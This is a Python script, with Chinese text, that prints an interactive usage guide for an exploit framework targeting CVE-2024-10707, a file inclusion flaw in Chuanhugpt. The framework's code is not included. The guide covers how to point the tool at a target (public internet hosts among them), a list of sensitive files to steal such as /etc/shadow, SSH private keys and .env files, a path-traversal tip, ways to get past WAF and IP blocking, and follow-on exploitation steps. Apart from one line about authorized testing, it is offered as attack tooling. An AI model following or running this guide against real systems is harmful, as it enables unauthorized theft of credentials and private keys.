#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2024-10707 Chuanhugpt文件包含漏洞利用框架使用指南
简化版本，避免编码问题
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

def show_basic_usage():
    """显示基本使用方法"""
    print("=== CVE-2024-10707 基本使用方法 ===")
    print()
    print("1. 修改目标URL:")
    print("   打开 CHUANHUGPT_FILE_INCLUSION_EXPLOIT.py")
    print("   找到第490行，修改 target_url")
    print("   例如: target_url = 'http://your-target.com:7860'")
    print()
    print("2. 运行利用框架:")
    print("   python CHUANHUGPT_FILE_INCLUSION_EXPLOIT.py")
    print()
    print("3. 查看结果:")
    print("   控制台显示执行进度")
    print("   详细报告保存在: chuanhugpt_file_inclusion_report.json")
    print()

def show_config_examples():
    """显示配置示例"""
    print("=== 配置示例 ===")
    print()

    print("示例1: 基本配置")
    print("```python")
    print("from CHUANHUGPT_FILE_INCLUSION_EXPLOIT import ExploitConfig, ChuanhugptFileInclusionExploiter")
    print()
    print("# 基本配置")
    print("config = ExploitConfig(")
    print("    target_url='http://target.com:7860',")
    print("    timeout=15,")
    print("    max_retries=3,")
    print("    delay_between_requests=2.0")
    print(")")
    print()
    print("exploiter = ChuanhugptFileInclusionExploiter(config)")
    print("report = exploiter.run_comprehensive_exploitation()")
    print("```")
    print()

    print("示例2: 高级配置")
    print("```python")
    print("# 高级配置 - 针对高延迟目标")
    print("config = ExploitConfig(")
    print("    target_url='https://slow-target.com',")
    print("    timeout=30,          # 增加超时")
    print("    max_retries=5,       # 增加重试")
    print("    delay_between_requests=1.0,  # 减少延迟")
    print("    user_agent='Mozilla/5.0 (X11; Linux x86_64)'")
    print(")")
    print("```")
    print()

def show_target_types():
    """显示目标类型"""
    print("=== 目标类型和端口配置 ===")
    print()

    targets = {
        "本地开发": "http://localhost:7860",
        "Docker容器": "http://127.0.0.1:7860",
        "内网服务器": "http://192.168.x.x:7860",
        "公网目标": "https://domain.com:7860",
        "反向代理": "https://proxy.com/path"
    }

    for target_type, example in targets.items():
        print(f"{target_type}: {example}")

    print()
    print("注意: Chuanhugpt默认端口是7860")
    print()

def show_exploit_phases():
    """显示利用阶段"""
    print("=== 利用阶段说明 ===")
    print()

    phases = [
        ("1. 指纹识别", "检查目标是否为Chuanhugpt应用"),
        ("2. 漏洞探测", "测试gr.JSON组件的文件包含漏洞"),
        ("3. 文件枚举", "测试30+个敏感文件路径"),
        ("4. 数据提取", "提取系统信息、用户账户、配置等"),
        ("5. 权限提升", "尝试读取更高权限的文件"),
        ("6. 报告生成", "生成详细的利用报告")
    ]

    for phase, description in phases:
        print(f"{phase}: {description}")
    print()

def show_sensitive_files():
    """显示敏感文件列表"""
    print("=== 主要敏感文件目标 ===")
    print()

    file_categories = {
        "系统文件": [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/issue",
            "/proc/version"
        ],
        "应用配置": [
            "/app/config.py",
            "/app/.env",
            "/app/requirements.txt",
            "/var/www/html/config.php"
        ],
        "SSH密钥": [
            "/root/.ssh/id_rsa",
            "/home/*/.ssh/id_rsa",
            "/etc/ssh/ssh_host_*_key"
        ],
        "数据库文件": [
            "/var/lib/mysql/mysql/user.MYD",
            "/etc/postgresql/*/main/pg_hba.conf"
        ]
    }

    for category, files in file_categories.items():
        print(f"{category}:")
        for file_path in files[:3]:  # 只显示前3个
            print(f"  {file_path}")
        if len(files) > 3:
            print(f"  ... 还有{len(files)-3}个文件")
        print()

def show_usage_tips():
    """显示使用技巧"""
    print("=== 使用技巧和注意事项 ===")
    print()

    tips = [
        "1. 目标确认: 确保目标是Chuanhugpt应用且存在CVE-2024-10707漏洞",
        "2. 网络检查: 确保能够访问目标URL和端口",
        "3. 权限问题: 某些文件可能需要更高权限才能读取",
        "4. 路径遍历: 使用../../../进行目录遍历",
        "5. 延迟调整: 根据网络状况调整delay_between_requests",
        "6. 错误处理: 查看详细日志了解失败原因",
        "7. 法律合规: 仅用于授权的安全测试"
    ]

    for tip in tips:
        print(tip)
    print()

def show_quick_start():
    """显示快速开始"""
    print("=== 快速开始步骤 ===")
    print()

    steps = [
        "步骤1: 确认目标",
        "  - 访问目标URL确认是Chuanhugpt应用",
        "  - 检查端口(默认7860)是否开放",
        "",
        "步骤2: 修改配置",
        "  - 编辑CHUANHUGPT_FILE_INCLUSION_EXPLOIT.py",
        "  - 修改第490行的target_url为你的目标",
        "",
        "步骤3: 执行利用",
        "  - 运行: python CHUANHUGPT_FILE_INCLUSION_EXPLOIT.py",
        "  - 观察控制台输出",
        "",
        "步骤4: 分析结果",
        "  - 查看控制台的成功读取文件数",
        "  - 打开chuanhugpt_file_inclusion_report.json查看详细报告",
        "",
        "步骤5: 后续利用",
        "  - 根据提取的信息进行进一步的渗透测试",
        "  - 使用其他工具进行漏洞利用"
    ]

    for step in steps:
        print(step)

def show_error_solutions():
    """显示错误解决方案"""
    print("=== 常见错误解决方案 ===")
    print()

    errors = {
        "连接超时": [
            "检查目标URL是否正确",
            "确认目标服务是否运行",
            "增加timeout参数值",
            "检查网络连接"
        ],
        "无法读取文件": [
            "目标可能已修复漏洞",
            "文件路径不存在",
            "权限不足",
            "尝试其他文件路径"
        ],
        "指纹识别失败": [
            "目标不是Chuanhugpt应用",
            "应用版本不支持",
            "网页被修改"
        ],
        "请求被阻止": [
            "目标有WAF防护",
            "IP被限制",
            "需要代理或VPN"
        ]
    }

    for error, solutions in errors.items():
        print(f"{error}:")
        for solution in solutions:
            print(f"  - {solution}")
        print()

def show_report_analysis():
    """显示报告分析"""
    print("=== 报告分析指南 ===")
    print()

    print("生成的JSON报告包含以下关键信息:")
    print()

    report_structure = {
        "exploitation_summary": "利用摘要 - 总体统计信息",
        "exploitation_results": "详细结果 - 每个文件的测试结果",
        "successful_exploits": "成功利用 - 确认可以读取的文件",
        "system_information": "系统信息 - 提取的目标系统详情",
        "extracted_data": "提取数据 - 敏感信息分类汇总",
        "security_recommendations": "安全建议 - 修复建议"
    }

    for key, description in report_structure.items():
        print(f"{key}: {description}")
    print()

    print("关键指标:")
    print("- total_files_tested: 测试的文件总数")
    print("- successful_reads: 成功读取的文件数")
    print("- confidence_scores: 各次利用的置信度分数")
    print("- execution_time: 总执行时间")
    print()

def main():
    """主函数"""
    print("CVE-2024-10707 Chuanhugpt文件包含漏洞利用框架使用指南")
    print("="*60)
    print()

    while True:
        print("请选择要查看的内容:")
        print("1 - 基本使用方法")
        print("2 - 配置示例")
        print("3 - 目标类型")
        print("4 - 利用阶段")
        print("5 - 敏感文件列表")
        print("6 - 使用技巧")
        print("7 - 快速开始")
        print("8 - 错误解决方案")
        print("9 - 报告分析指南")
        print("0 - 退出")
        print()

        try:
            choice = input("请选择 (0-9): ").strip()

            if choice == "0":
                print("退出指南")
                break
            elif choice == "1":
                show_basic_usage()
            elif choice == "2":
                show_config_examples()
            elif choice == "3":
                show_target_types()
            elif choice == "4":
                show_exploit_phases()
            elif choice == "5":
                show_sensitive_files()
            elif choice == "6":
                show_usage_tips()
            elif choice == "7":
                show_quick_start()
            elif choice == "8":
                show_error_solutions()
            elif choice == "9":
                show_report_analysis()
            else:
                print("无效选择，请重新输入")

            input("\n按回车键继续...")
            print("\n" + "="*60 + "\n")

        except KeyboardInterrupt:
            print("\n退出指南")
            break
        except Exception as e:
            print(f"发生错误: {e}")

if __name__ == "__main__":
    main()